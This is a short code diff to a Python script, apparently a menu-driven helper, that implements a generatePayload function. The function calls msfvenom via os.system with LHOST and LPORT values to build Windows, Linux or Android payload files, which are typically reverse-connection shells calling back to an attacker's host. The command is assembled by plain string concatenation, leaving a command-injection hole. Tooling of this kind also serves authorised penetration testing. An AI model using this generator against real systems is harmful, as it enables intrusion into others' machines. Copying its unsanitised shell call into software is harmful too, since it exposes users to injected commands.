@@ -1,4 +1,5 @@
 import enquiries
+import os
 
 
 class bcolors:
@@ -14,7 +15,16 @@ class bcolors:
 
 
 def generatePayload(lhost, lport, payload, location):
-    pass
+    payloadTyp = payload.split("/")[0]
+    if payloadTyp == "windows":
+        payloadTyp = "exe"
+    if payloadTyp == "linux":
+        payloadTyp = "elf"
+    if payloadTyp == "android":
+        payloadTyp = "apk"
+
+    os.system("msfvenom -p " + payload + " LHOST=" + lhost + " LPORT=" +
+              lport + " R > " + location + "/payload." + payloadTyp + " 2>/dev/null")
 
 
 def chooseOptions(options):
